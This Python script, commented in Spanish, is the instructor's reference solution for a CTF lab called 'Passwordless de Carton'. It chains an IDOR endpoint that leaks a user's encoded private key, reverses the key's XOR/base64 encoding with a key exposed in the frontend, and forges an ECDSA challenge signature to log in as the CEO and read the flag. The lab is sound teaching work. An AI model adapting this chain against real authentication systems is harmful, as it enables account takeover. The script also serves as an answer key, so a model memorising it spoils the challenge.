"""
Solucion de referencia del CTF "Passwordless de Carton" (HackerBank).

Encadena las 3 capas del desafio y termina autenticandose como el CEO para
leer el codigo ganador. Pensado como writeup ejecutable para el instructor;
un estudiante llegaria a esto mismo tras explorar con Burp + DevTools.

Requisitos:  pip install requests cryptography
Uso:         python solve.py            (usa http://localhost:5000 por defecto)
             python solve.py http://host:5000
"""
import base64
import sys

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"

# La MISMA clave que esta a la vista en static/js/script.js (constante
# BACKUP_KEY). Es lo que hace reversible la "codificacion".
BACKUP_KEY = b"hb_backup_key_2026"

TARGET_USERNAME = "ceo"


def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def decode(encoded: str) -> str:
    """Revierte base64( XOR( base64(PEM), key ) ) -> PEM en claro."""
    xored = base64.b64decode(encoded)
    inner_b64 = xor(xored, BACKUP_KEY)
    return base64.b64decode(inner_b64).decode("ascii")


def raw_signature(private_key, challenge: str) -> str:
    """Firma el challenge y devuelve la firma en formato raw r||s (64 bytes)
    hex, que es lo que el servidor espera (el mismo que produce WebCrypto)."""
    der = private_key.sign(challenge.encode("utf-8"), ec.ECDSA(hashes.SHA256()))
    r, s = decode_dss_signature(der)
    raw = r.to_bytes(32, "big") + s.to_bytes(32, "big")
    return raw.hex()


def main():
    session = requests.Session()

    # --- Capa 3.1: pedir un challenge fresco para el CEO ---
    # (De paso, la respuesta filtra el user_id del CEO: primera pista del IDOR.)
    ch = session.post(f"{BASE}/auth/challenge", json={"username": TARGET_USERNAME}).json()
    ceo_id = ch["user_id"]
    challenge = ch["challenge"]
    print(f"[1] Challenge del CEO (user_id={ceo_id}): {challenge}")

    # --- Capa 2: robar la clave privada del CEO por el endpoint con IDOR ---
    keys = session.get(f"{BASE}/auth/keys/{ceo_id}").json()
    print(f"[2] Clave privada codificada descargada de /auth/keys/{ceo_id}")
    private_pem = decode(keys["private_key"])
    private_key = serialization.load_pem_private_key(private_pem.encode("ascii"), password=None)
    print("    Decodificada con la key del frontend -> PEM en claro.")

    # --- Capa 3.2: firmar el challenge como si fueramos el CEO ---
    signature = raw_signature(private_key, challenge)
    print(f"[3] Challenge firmado (raw r||s): {signature[:32]}...")

    # --- Capa 3.3: enviar la firma y entrar ---
    verify = session.post(
        f"{BASE}/auth/verify",
        json={"username": TARGET_USERNAME, "challenge": challenge, "signature": signature},
    ).json()
    if not verify.get("ok"):
        print(f"[!] Fallo la verificacion: {verify}")
        return
    print(f"[4] Autenticados como el CEO. Redirige a: {verify['next']}")

    # --- Leer el codigo ganador desde el dashboard del CEO ---
    dashboard = session.get(f"{BASE}{verify['next']}").text
    import re
    match = re.search(r"flag-code[^>]*>([0-9a-f]{32})<", dashboard)
    flag = match.group(1) if match else "(no encontrada en el HTML)"
    print(f"\n>>> CODIGO GANADOR: {flag}")


if __name__ == "__main__":
    main()
